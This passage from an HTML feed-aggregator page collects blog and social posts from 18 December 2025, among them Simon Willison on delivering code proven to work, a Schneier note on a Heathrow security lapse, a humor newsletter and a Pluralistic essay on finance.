-<li><a href="https://notes.jim-nielsen.com/#2025-12-18T1128">https://notes.jim-nielsen.com/#2025-12-18T1128</a></li>
-<li><a href="https://notes.jim-nielsen.com/#2025-12-18T1136">https://notes.jim-nielsen.com/#2025-12-18T1136</a></li>
-</ul>
-<hr>
-<p>Reply via:</p>
-<p><a href="mailto:jimniels%2Bblog@gmail.com?subject=Re:%20blog.jim-nielsen.com/2025/you-might-also-like-my-notes-blog/">Email</a>
-· <a href="https://mastodon.social/@jimniels">Mastodon</a> ·</p>
-<p><a href="https://bsky.app/profile/jim-nielsen.com">Bluesky</a></p>
-
-      <address>
-        <a href="https://blog.jim-nielsen.com/2025/you-might-also-like-my-notes-blog/">https://blog.jim-nielsen.com/2025/you-might-also-like-my-notes-blog/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T18:53:05Z" data-link="https://mastodon.social/@davew/115742077640877762">
-      <h1>@Dave Winer's linkblog</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Firefox, look at the web as your product, and do things that make it easy for independent devs to create products for the web without locking users in.</p>
-
-      <address>
-        <a href="https://mastodon.social/@davew/115742077640877762">https://mastodon.social/@davew/115742077640877762</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T17:50:32Z" data-link="https://guykawasaki.substack.com/p/how-behavioral-economics-shapes-our">
-      <h1>How Behavioral Economics Shapes Our World </h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>In this week’s episode of Remarkable People, I talk with Nobel Laureate Richard Thaler and Alex Imas, the minds who made economics human again.</p>
-
-      <address>
-        <a href="https://guykawasaki.substack.com/p/how-behavioral-economics-shapes-our">https://guykawasaki.substack.com/p/how-behavioral-economics-shapes-our</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T17:07:00Z" data-link="https://bsky.app/profile/dairinstitute.bsky.social/post/3mabnzy7ers2d">
-      <h1>@DAIR blog</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>NEW: Mystery AI Hype Theater 3000, Episode 68: This is What Algo-cracy Looks Like</p>
-<p>Tech bros say automation can strengthen democracy. @alexhanna.bsky.social and @emilymbender.bsky.social unpack their flimsy arguments about the democratic process.</p>
-<p><a href="https://www.buzzsprout.com/2126417/episodes/18352083-this-is-what-algo-cracy-looks-like-2025-12-01">https://www.buzzsprout.com/2126417/episodes/18352083-this-is-what-algo-cracy-looks-like-2025-12-01</a></p>
-
-      <address>
-        <a href="https://bsky.app/profile/dairinstitute.bsky.social/post/3mabnzy7ers2d">https://bsky.app/profile/dairinstitute.bsky.social/post/3mabnzy7ers2d</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T17:00:10Z" data-link="https://blogs.windows.com/windowsdeveloper/2025/12/18/2025-in-review-how-we-elevated-the-microsoft-store-experience/">
-      <h1>2025 in review: How we elevated the Microsoft Store experience</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>2025 was a meaningful year for the Microsoft Store on Windows, with more than 250 million monthly users discovering a Microsoft Store that feels more personalized, helpful and delightful to use. We welcomed exciting new arrivals to the st</p>
-<p>The post <a href="https://blogs.windows.com/windowsdeveloper/2025/12/18/2025-in-review-how-we-elevated-the-microsoft-store-experience/">2025 in review: How we elevated the Microsoft Store experience</a> appeared first on <a href="https://blogs.windows.com/windowsdeveloper">Windows Developer Blog</a>.</p>
-
-      <address>
-        <a href="https://blogs.windows.com/windowsdeveloper/2025/12/18/2025-in-review-how-we-elevated-the-microsoft-store-experience/">https://blogs.windows.com/windowsdeveloper/2025/12/18/2025-in-review-how-we-elevated-the-microsoft-store-experience/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T16:50:44Z" data-link="https://www.notesfromthecircus.com/p/a-conspiracy-of-capital">
-      <h1>A Conspiracy of Capital</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>How Political Favor Became a Deal Variable</p>
-
-      <address>
-        <a href="https://www.notesfromthecircus.com/p/a-conspiracy-of-capital">https://www.notesfromthecircus.com/p/a-conspiracy-of-capital</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T16:50:00Z" data-link="https://bsky.app/profile/barackobama.bsky.social/post/3mabn2xkxts2v">
-      <h1>@Barack Obama @Bsky</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>While in Chicago, I took a tour around the Obama Presidential Center. I can’t wait for you all to visit in June 2026. Here’s a sneak peek:</p>
-
-      <address>
-        <a href="https://bsky.app/profile/barackobama.bsky.social/post/3mabn2xkxts2v">https://bsky.app/profile/barackobama.bsky.social/post/3mabn2xkxts2v</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T16:41:14Z" data-link="https://www.schneier.com/blog/archives/2025/12/someone-boarded-a-plane-at-heathrow-without-a-ticket-or-passport.html">
-      <h1>Someone Boarded a Plane at Heathrow Without a Ticket or Passport</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>I’m sure there’s a <a href="https://ca.news.yahoo.com/man-boards-heathrow-flight-without-081243825.html">story here</a>:</p>
-<blockquote>
-<p>Sources say the man had tailgated his way through to security screening and passed security, meaning he was not detected carrying any banned items.</p>
-<p>The man deceived the BA check-in agent by posing as a family member who had their passports and boarding passes inspected in the usual way.</p>
-</blockquote>
-
-      <address>
-        <a href="https://www.schneier.com/blog/archives/2025/12/someone-boarded-a-plane-at-heathrow-without-a-ticket-or-passport.html">https://www.schneier.com/blog/archives/2025/12/someone-boarded-a-plane-at-heathrow-without-a-ticket-or-passport.html</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T16:00:00Z" data-link="https://buttondown.com/humorouswriting/archive/a-newsletter-of-humorous-writing-423/">
-      <h1>A Newsletter of Humorous Writing #423</h1>
-
-(date: 2025-12-18)
-      <p>
-      <h3><em>For December 10-16, 2025</em></h3>
-<p>Hello and welcome to <strong>A Newsletter of Humorous Writing</strong>, a roundup of the week's finest short humor pieces and funny articles, and a celebration of the fantastic writers who wrote them. This week we’re excited to announce that we’re working on a kids book! It’s a riff on <em>Is Your Mama a Llama?</em> that we’re calling <em>Is Your Vasco da Gama?</em> We can just do that, right?</p>
-<hr>
-<h2>What We Enjoyed This Week</h2>
-<p><a href="https://www.mcsweeneys.net/articles/red-and-green-flags-according-to-protagonists-of-hallmark-christmas-movies?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>Red and Green Flags, According to Protagonists of Hallmark Christmas Movies</strong></a> <strong>by</strong> <a href="https://www.madelinegoetz.com/?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>Madeline Goetz</strong></a> <strong>and</strong> <a href="https://www.instagram.com/will_lampe/?hl=en&amp;utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>Will Lampe</strong></a> <em>(McSweeney’s)</em> This piece is full of great riffs on Hallmark movie details, and the structure (with its seasonally appropriate colors) lends itself to some really satisfying setups and punchlines. But what we particularly enjoyed was the turn this piece takes around the halfway mark, when it becomes clear that all of these red/green flags are being experienced by the same person, and a delightfully strange version of a Hallmark movie narrative emerges.</p>
-<p><a href="https://www.newyorker.com/magazine/2025/12/15/the-show-must-go-on?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>The Show Must Go On</strong></a> <strong>by</strong> <a href="http://www.adrian-tomine.com/?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>Adrian Tomine</strong></a> <em>(The New Yorker)</em> This is a fun and funny short autobiographical comic about how your relationship to certain things in the place where you live changes as you get older. Though it’s a quick one, Adrian manages to bring everything full circle in a very satisfying way.</p>
-<p><a href="https://www.pointsincase.com/articles/there-will-never-be-a-sale-this-good-until-next-week?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>There Will Never Be a Sale This Good Until Next Week</strong></a> <strong>by</strong> <a href="https://www.pointsincase.com/author/alex-laskey?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>Alex Laskey</strong></a> <em>(Points in Case)</em> This piece perfectly captures how, when shopping online, you sometimes wind up rationalizing the choice to spend a bunch more than you originally intended. It’s so funny the way the narrator’s tone switches from being disingenuously ingratiating to quietly menacing (and later to being outright threatening):</p>
-<p>“Although, you know what… and I just thought of this now, if you can get that subtotal above $75, we’ll just get rid of that shipping cost all together. I mean I’m no mathematician, but that seems like an obvious choice to me! Hahahaha! Here’s some more of our products.</p>
-<p>Good boy.”</p>
-<hr>
-<blockquote>
-<p>-- AD --</p>
-<p>Humor and pathos and then humor again (because who wants to end on pathos?). <a href="http://tinyurl.com/3cf4c6jz?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>Low Swank</strong> is a good read</a>, and totally worth the inbox space.</p>
-<p>---</p>
-<p><em>Points in Case</em> is looking for a part time editor to temporarily take over some work at the site next year! If you think you might be a good fit, send an email to <a href="mailto:james@pointsincase.com">james@pointsincase.com</a> with the subject “Temporary Editor” and include a few details about your background and what you’d bring to the role!</p>
-<p>---</p>
-<p><em>(Do you have an ad you'd like to place in the Newsletter?</em> <a href="https://docs.google.com/forms/d/e/1FAIpQLSeJlHErf2PuWr5NxqLbD6dhf7s31pzCC3sBVCHJ24exAwfmgQ/viewform?usp=sf_link&amp;utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><em>Fill out this form!</em></a> <em>)</em></p>
-</blockquote>
-<hr>
-<h2>An Old Favorite</h2>
-<p><a href="https://www.mcsweeneys.net/articles/translation-of-a-seemingly-pleasant-conversation-between-my-two-aunts-at-christmas?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-117"><strong>Translation of a Seemingly Pleasant Conversation Between My Two Aunts At Christmas</strong></a> <strong>by</strong> <a href="https://www.mcsweeneys.net/authors/rose-o-shea?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>Rose O’Shea</strong></a> <em>(McSweeney’s)</em> We included this back in the day in <a href="https://buttondown.com/humorouswriting/archive/a-newsletter-of-humorous-writing-117/">Newsletter #117</a> and we’re pleased to report that it’s still as great as we originally thought it was. The form is terrific, allowing Rose to quickly shift between banal pleasantries and the heightened tone of the translations, generating a ton of laughs. As we said at the time, some damn good prose! “‘Yes, it’s just so good to all be together.’ ( <em>Your wickedness has poisoned our bloodline. I weep for your children, born they of a gargoyle</em>.)”</p>
-<p>The turn the piece takes at the end is also a very nice, unexpected use of the form, and wraps things up in a way that feels satisfying and completely earned.</p>
-<p><em>Do you have an Old Favorite of your own? Let us know by filling out</em> <a href="http://forms.gle/9iALhpfsAn9mvn4p8?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><em>this form</em></a> <em>and we may run your pick in a future edition of the newsletter.</em></p>
-<hr>
-<h2>Updates From Your Editors and Friends of the Newsletter</h2>
-<p>A <a href="https://lukevburns.tumblr.com/UpcomingWorkshops?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423">BUNCH of Luke’s January short humor workshops</a> are SOLD OUT, but he’s still got spots in his advanced workshop on <a href="https://docs.google.com/forms/d/e/1FAIpQLSercS0dJ-PglLYmxGkgeOrr86Q017uxjZlICZCDNBmYiE0jwg/viewform?usp=dialog&amp;utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423">Thursday afternoons</a> and his intro class on <a href="https://docs.google.com/forms/d/e/1FAIpQLScFxfmNay9xwJyNhV8x0vy0Ehe0UrBccYBqHh4mahetmKcspQ/viewform?usp=dialog&amp;utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423">Saturday afternoons</a>! He JUST also added a section on <a href="https://docs.google.com/forms/d/e/1FAIpQLSe-808D1vrHcaiTdgQWC69rHn4IKXX4ev82-NxhuA_WWOsuDg/viewform?usp=dialog&amp;utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423">Wednesday nights</a> that has just TWO spots left. A great way to kick off the new year and get a head start on those writing resolutions.</p>
-
-      <address>
-        <a href="https://buttondown.com/humorouswriting/archive/a-newsletter-of-humorous-writing-423/">https://buttondown.com/humorouswriting/archive/a-newsletter-of-humorous-writing-423/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T15:30:13Z" data-link="http://toolkit.wellgedacht.org/doku.php?id=articles:ressources_libraries_etc&rev=1766071813&do=diff">
-      <h1>ressources_libraries_etc</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>\* Tools for digital publishing
-\* A small intro to CSS by Declarations
-\* HTML Guide  and CSS Guide  by Laurel Schwulst
-\* Tutorials for website building (HTML, CSS) by Laurel Schwulst:
-\* Inspiration for DIY websites with HTML &amp; CSS:
-\* Some Websites in DIY spirit
-\* Turn a cryptpad into a website:</p>
-
-      <address>
-        <a href="http://toolkit.wellgedacht.org/doku.php?id=articles:ressources_libraries_etc&rev=1766071813&do=diff">http://toolkit.wellgedacht.org/doku.php?id=articles:ressources_libraries_etc&rev=1766071813&do=diff</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T15:25:39Z" data-link="https://doc.searls.com/2025/12/18/department-of-collections/">
-      <h1>Department of Collections</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Gruntles First, I hate liquid glass, with its water-stain lettering and deeply cropped and rounded window and icon corners (which give you fewer pixels to click on and harder corners to grab and pull.) I’ll say more about it after the holidays. Meanwhile, if you’re with me, this will help. Second, I continue to insist […]</p>
-
-      <address>
-        <a href="https://doc.searls.com/2025/12/18/department-of-collections/">https://doc.searls.com/2025/12/18/department-of-collections/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T15:00:00Z" data-link="https://dbushell.com/2025/12/18/year-in-review/">
-      <h1>I Survived 2025</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>I have survived another year of self-employment! Business has changed over that time. Gone are the days I can freely share a neat case study online. Clients demand confidentiality. I front-end develop and I refuse to prompt and everything else is a secret! Can I survive next year? […]</p>
-
-      <address>
-        <a href="https://dbushell.com/2025/12/18/year-in-review/">https://dbushell.com/2025/12/18/year-in-review/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T14:49:38Z" data-link="https://simonwillison.net/2025/Dec/18/code-proven-to-work/#atom-everything">
-      <h1>Your job is to deliver code you have proven to work</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>In all of the debates about the value of AI-assistance in software development there's one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers - or open source maintainers - and expects the &quot;code review&quot; process to handle the rest.</p>
-<p>This is rude, a waste of other people's time, and is honestly a dereliction of duty as a software developer.</p>
-<p><strong>Your job is to deliver code you have proven to work.</strong></p>
-<p>As software engineers we don't just crank out code - in fact these days you could argue that's what the LLMs are for. We need to deliver <em>code that works</em> - and we need to include <em>proof</em> that it works as well. Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.</p>
-<h4>How to prove it works</h4>
-<p>There are two steps to proving a piece of code works. Neither is optional.</p>
-<p>The first is <strong>manual testing</strong>. If you haven't seen the code do the right thing yourself, that code doesn't work. If it does turn out to work, that's honestly just pure chance.</p>
-<p>Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.</p>
-<p>If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here's a <a href="https://github.com/simonw/llm-gemini/issues/116#issuecomment-3666551798">recent example</a>.</p>
-<p>Some changes are harder to demonstrate. It's still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.</p>
-<p>Once you've tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.</p>
-<p>The second step in proving a change works is <strong>automated testing</strong>. This is so much easier now that we have LLM tooling, which means there's no excuse at all for skipping this step.</p>
-<p>Your contribution should <a href="https://simonwillison.net/2022/Oct/29/the-perfect-commit/">bundle the change</a> with an automated test that proves the change works. That test should fail if you revert the implementation.</p>
-<p>The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.</p>
-<p>Don't be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I've done this myself I've quickly regretted it.</p>
-<h4>Make your coding agent prove it first</h4>
-<p>The most important trend in LLMs in 2025 has been the explosive growth of <strong>coding agents</strong> - tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.</p>
-<p>To master these tools you need to learn how to get them to <em>prove their changes work</em> as well.</p>
-<p>This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.</p>
-<p>Since they're robots, automated tests and manual tests are effectively the same thing.</p>
-<p>They do feel a little different though. When I'm working on CLI tools I'll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like <a href="https://click.palletsprojects.com/en/stable/testing/">Click's CLIRunner</a>.</p>
-<p>When working on CSS changes I'll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.</p>
-<p>The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They'll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.</p>
-<p>Developing good taste in testing code is another of those skills that differentiates a senior engineer.</p>
-<h4>The human provides the accountability</h4>
-<p><a href="https://simonwillison.net/2025/Feb/3/a-computer-can-never-be-held-accountable/">A computer can never be held accountable</a>. That's your job as the human in the loop.</p>
-<p>Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That's no longer valuable. What's valuable is contributing <em>code that is proven to work</em>.</p>
-<p>Next time you submit a PR, make sure you've included your evidence that it works as it should.</p>
-<p>Tags: <a href="https://simonwillison.net/tags/programming">programming</a>, <a href="https://simonwillison.net/tags/careers">careers</a>, <a href="https://simonwillison.net/tags/ai">ai</a>, <a href="https://simonwillison.net/tags/generative-ai">generative-ai</a>, <a href="https://simonwillison.net/tags/llms">llms</a>, <a href="https://simonwillison.net/tags/ai-assisted-programming">ai-assisted-programming</a>, <a href="https://simonwillison.net/tags/ai-ethics">ai-ethics</a>, <a href="https://simonwillison.net/tags/vibe-coding">vibe-coding</a>, <a href="https://simonwillison.net/tags/coding-agents">coding-agents</a></p>
-
-      <address>
-        <a href="https://simonwillison.net/2025/Dec/18/code-proven-to-work/#atom-everything">https://simonwillison.net/2025/Dec/18/code-proven-to-work/#atom-everything</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T14:40:11Z" data-link="https://pluralistic.net/2025/12/18/self-licking-ice-cream-cone/">
-      <h1>Pluralistic: A perfect distillation of the social uselessness of finance (18 Dec 2025)</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Today's links A perfect distillation of the social uselessness of finance: A final thought for the yule. Hey look at this: Delights to delectate. Object permanence: Droidflake; Spy Skymall; Malthus is a dope; Happy Public Domain Day 2025. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. A perfect distillation of the social uselessness of finance (permalink) I'm about to sign off for the year – actually, I was ready to do it yesterday, but then I happened upon a brief piece of writing that was so perfect that I decided I'd do one more edition of Pluralistic for 2025. The piece in question is John Lanchester's &quot;For Every Winner A Loser,&quot; in the London Review of Books, in which Lanchester reviews two books about the finance sector: Gary Stevenson's The Trading Game and Rob Copeland's The Fund: <a href="https://www.lrb.co.uk/the-paper/v46/n17/john-lanchester/for-every-winner-a-loser">https://www.lrb.co.uk/the-paper/v46/n17/john-lanchester/for-every-winner-a-loser</a> It's a long and fascinating piece and it's certainly left me wanting to read both books, but that's not what convinced me to do one more newsletter before going on break – rather, it was a brief passage in the essay's preamble, a passage that perfectly captures the total social uselessness of the finance sector as a whole. Lanchester starts by stating that while we think of the role of the finance sector as &quot;capital allocation&quot; – that is, using investors' money to fund new businesses and expansions for existing business – that hasn't been important to finance for quite some time. Today, only 3% of bank activity consists of &quot;lending to firms and individuals engaged in the production of goods and services.&quot; The other 97% of finance is gambling. Here's how Stevenson breaks it down: say your farm grows mangoes. You need money before the mangoes are harvested, so you sell the future ownership of the harvest to a broker at <span class="math inline">\(1/crate. The broker immediately flips that interest in your harvest to a dealer who believes (on the basis of a rumor about bad weather) that mangoes will be scarce this year and is willing to pay \)</span>1.10/crate. Next, an international speculator (trading on the same rumor) buys the rights from the broker at <span class="math inline">\(1.20/crate. Now come the side bets: a "momentum trader" (who specializing in bets on market trends continuing) buys the rights to your crop for \)</span>1.30/crate. A contrarian trader (who bets against momentum traders) short-sells the momentum trader's bet at <span class="math inline">\(1.20. More short sellers pile in and drive the price down to \)</span>1/crate. Now, a new rumor circulates, about conditions being ripe for a bounteous mango harvest, so more short-sellers appear, and push the price to <span class="math inline">\(0.90/crate. This tempts the original broker back in, and he buys your crop back at \)</span>1/crate. That's when the harvest comes. You bring in the mangoes. They go to market, and fetch <span class="math inline">\(1.10/crate. This is finance – a welter of transactions, only one of which (selling your mangoes to people who eat them) involves the real economy. Everything else is "speculation on the movement of prices." The nine transactions that took place between your planting the crop and someone eating the mangoes are all zero sum – every trade has an evenly matched winner and loser, and when you sum them all up, they come out to zero. In other words, no value was created. This is the finance sector. In a world where the real economy generates \)</span>105 trillion/year, the financial derivatives market adds up to $667 trillion/year. This is &quot;the biggest business in the world&quot; – and it's useless. It produces nothing. It adds no value. If you work a job where you do something useful, you are on the losing side of this economy. All the real money is in this socially useless, no-value-creating, hypertrophied, metastasized finance sector. Every gain in finance is matched by a loss. It all amounts to – literally – nothing. So that's what tempted me into one more blog post for the year – an absolutely perfect distillation of the uselessness of &quot;the biggest business in the world,&quot; whose masters are the degenerate gamblers who buy and sell our politicians, set our policy, and control our lives. They're the ones enshittifying the internet, burning down the planet, and pushing Elon Musk towards trillionairedom. It's their world, and we just live on it. For now. (Image: Sam Valadi, CC BY 2.0, modified) Hey look at this (permalink) Meta Is Considering Charging Business Pages To Post Links <a href="https://www.socialmediatoday.com/news/meta-considering-charging-business-pages-to-post-links/808099/">https://www.socialmediatoday.com/news/meta-considering-charging-business-pages-to-post-links/808099/</a> The original Mozilla &quot;Dinosaur&quot; logo artwork <a href="https://www.jwz.org/blog/2025/12/the-original-mozilla-dinosaur-logo-artwork/">https://www.jwz.org/blog/2025/12/the-original-mozilla-dinosaur-logo-artwork/</a> A Local Self-Reliance Agenda for New York City: ILSR’s Memo to Mamdani <a href="https://ilsr.org/articles/memo-mamdani/">https://ilsr.org/articles/memo-mamdani/</a> Apple loses its appeal of a scathing contempt ruling in iOS payments case <a href="https://arstechnica.com/tech-policy/2025/12/epic-celebrates-the-end-of-the-apple-tax-after-appeals-court-win-in-ios-payments-case/">https://arstechnica.com/tech-policy/2025/12/epic-celebrates-the-end-of-the-apple-tax-after-appeals-court-win-in-ios-payments-case/</a> The Internet’s Tollbooth Operators <a href="https://prospect.org/2025/12/10/internets-tollbooth-operators-wu-review/">https://prospect.org/2025/12/10/internets-tollbooth-operators-wu-review/</a> Barnum's Law of CEOs <a href="https://www.antipope.org/charlie/blog-static/2025/12/barnums-law-of-ceos.html">https://www.antipope.org/charlie/blog-static/2025/12/barnums-law-of-ceos.html</a> Google Starts Sharing All Your Text Messages With Your Employer <a href="https://archive.ph/wE2U7#selection-3936.0-3936.1">https://archive.ph/wE2U7#selection-3936.0-3936.1</a> Object permanence (permalink) #15yrsago Star Wars droidflake <a href="https://twitpic.com/3guwfq">https://twitpic.com/3guwfq</a> #15yrsago TSA misses enormous, loaded .40 calibre handgun in carry-on bag <a href="https://web.archive.org/web/20101217223617/https://abclocal.go.com/ktrk/story?section=news/local&amp;amp;id=7848683">https://web.archive.org/web/20101217223617/https://abclocal.go.com/ktrk/story?section=news/local&amp;amp;id=7848683</a> #15yrsago Brazilian TV clown elected to high office, passes literacy test <a href="https://web.archive.org/web/20111217233812/https://www.google.com/hostednews/afp/article/ALeqM5jmbXSjCjZBZ4z8VUcAZFCyY">https://web.archive.org/web/20111217233812/https://www.google.com/hostednews/afp/article/ALeqM5jmbXSjCjZBZ4z8VUcAZFCyY</a>_n6dA?docId=CNG.b7f4655178d3435c9a54db2e30817efb.381 #15yrsago My Internet problem: an abundance of choice <a href="https://www.theguardian.com/technology/blog/2010/dec/17/internet-problem-choice-self-publishing">https://www.theguardian.com/technology/blog/2010/dec/17/internet-problem-choice-self-publishing</a> #10yrsago LEAKED: The secret catalog American law enforcement orders cellphone-spying gear from <a href="https://theintercept.com/2015/12/16/a-secret-catalogue-of-government-gear-for-spying-on-your-cellphone/#10yrsago">https://theintercept.com/2015/12/16/a-secret-catalogue-of-government-gear-for-spying-on-your-cellphone/#10yrsago</a> #10yrsago Putin: Give Sepp Blatter the Nobel; Trump should be president <a href="https://www.theguardian.com/football/2015/dec/17/sepp-blatter-fifa-putin-nobel-peace-prize">https://www.theguardian.com/football/2015/dec/17/sepp-blatter-fifa-putin-nobel-peace-prize</a> #10yrsago Star Wars medical merch from Scarfolk, the horror-town stuck in the 1970s <a href="https://scarfolk.blogspot.com/2015/12/unreleased-star-wars-merchandise.html">https://scarfolk.blogspot.com/2015/12/unreleased-star-wars-merchandise.html</a> #10yrsago Some countries learned from America’s copyright mistakes: TPP will undo that <a href="https://www.eff.org/deeplinks/2015/12/how-tpp-perpetuates-mistakes-dmca">https://www.eff.org/deeplinks/2015/12/how-tpp-perpetuates-mistakes-dmca</a> #10yrsago No evidence that San Bernardino shooters posted about jihad on Facebook <a href="https://web.archive.org/web/20151217003406/https://www.washingtonpost.com/news/post-nation/wp/2015/12/16/fbi-san-bernardino-attackers-didnt-show-public-support-for-jihad-on-social-media/">https://web.archive.org/web/20151217003406/https://www.washingtonpost.com/news/post-nation/wp/2015/12/16/fbi-san-bernardino-attackers-didnt-show-public-support-for-jihad-on-social-media/</a> #10yrsago Exponential population growth and other unkillable science myths <a href="https://web.archive.org/web/20151217205215/http://www.nature.com/news/the-science-myths-that-will-not-die-1.19022">https://web.archive.org/web/20151217205215/http://www.nature.com/news/the-science-myths-that-will-not-die-1.19022</a> #10yrsago UK’s unaccountable crowdsourced blacklist to be crosslinked to facial recognition system <a href="https://arstechnica.com/tech-policy/2015/12/pre-crime-arrives-in-the-uk-better-make-sure-your-face-stays-off-the-crowdsourced-watch-list/">https://arstechnica.com/tech-policy/2015/12/pre-crime-arrives-in-the-uk-better-make-sure-your-face-stays-off-the-crowdsourced-watch-list/</a> #1yrago Happy Public Domain Day 2025 to all who celebrate <a href="https://pluralistic.net/2024/12/17/dastar-dly-deeds/#roast-in-piss-sonny-bono">https://pluralistic.net/2024/12/17/dastar-dly-deeds/#roast-in-piss-sonny-bono</a> Upcoming appearances (permalink) Hamburg: Chaos Communications Congress, Dec 27-30 <a href="https://events.ccc.de/congress/2025/infos/index.html">https://events.ccc.de/congress/2025/infos/index.html</a> Denver: Enshittification at Tattered Cover Colfax, Jan 22 <a href="https://www.eventbrite.com/e/cory-doctorow-live-at-tattered-cover-colfax-tickets-1976644174937">https://www.eventbrite.com/e/cory-doctorow-live-at-tattered-cover-colfax-tickets-1976644174937</a> Colorado Springs: Guest of Honor at COSine, Jan 23-25 <a href="https://www.firstfridayfandom.org/cosine/">https://www.firstfridayfandom.org/cosine/</a> Recent appearances (permalink) Enshittification on The Last Show With David Cooper: <a href="https://www.iheart.com/podcast/256-the-last-show-with-david-c-31145360/episode/cory-doctorow-enshttification-december-16-2025-313385767">https://www.iheart.com/podcast/256-the-last-show-with-david-c-31145360/episode/cory-doctorow-enshttification-december-16-2025-313385767</a> (Digital) Elbows Up (OCADU) <a href="https://vimeo.com/1146281673">https://vimeo.com/1146281673</a> How to Stop “Ensh*ttification” Before It Kills the Internet (Capitalisn't) <a href="https://www.youtube.com/watch?v=34gkIvYiHxU">https://www.youtube.com/watch?v=34gkIvYiHxU</a> Enshittification on The Daily Show <a href="https://www.youtube.com/watch?v=d2e-c9SF5nE">https://www.youtube.com/watch?v=d2e-c9SF5nE</a> Enshittification with Four Ways to Change the World (Channel 4) <a href="https://www.youtube.com/watch?v=tZQaEeuuI3Q">https://www.youtube.com/watch?v=tZQaEeuuI3Q</a> Latest books (permalink) &quot;Canny Valley&quot;: A limited edition collection of the collages I create for Pluralistic, self-published, September 2025 &quot;Enshittification: Why Everything Suddenly Got Worse and What to Do About It,&quot; Farrar, Straus, Giroux, October 7 2025 <a href="https://us.macmillan.com/books/9780374619329/enshittification/">https://us.macmillan.com/books/9780374619329/enshittification/</a> &quot;Picks and Shovels&quot;: a sequel to &quot;Red Team Blues,&quot; about the heroic era of the PC, Tor Books (US), Head of Zeus (UK), February 2025 (<a href="https://us.macmillan.com/books/9781250865908/picksandshovels)">https://us.macmillan.com/books/9781250865908/picksandshovels)</a>. &quot;The Bezzle&quot;: a sequel to &quot;Red Team Blues,&quot; about prison-tech and other grifts, Tor Books (US), Head of Zeus (UK), February 2024 (thebezzle.org). &quot;The Lost Cause:&quot; a solarpunk novel of hope in the climate emergency, Tor Books (US), Head of Zeus (UK), November 2023 (<a href="http://lost-cause.org">http://lost-cause.org</a>). &quot;The Internet Con&quot;: A nonfiction book about interoperability and Big Tech (Verso) September 2023 (<a 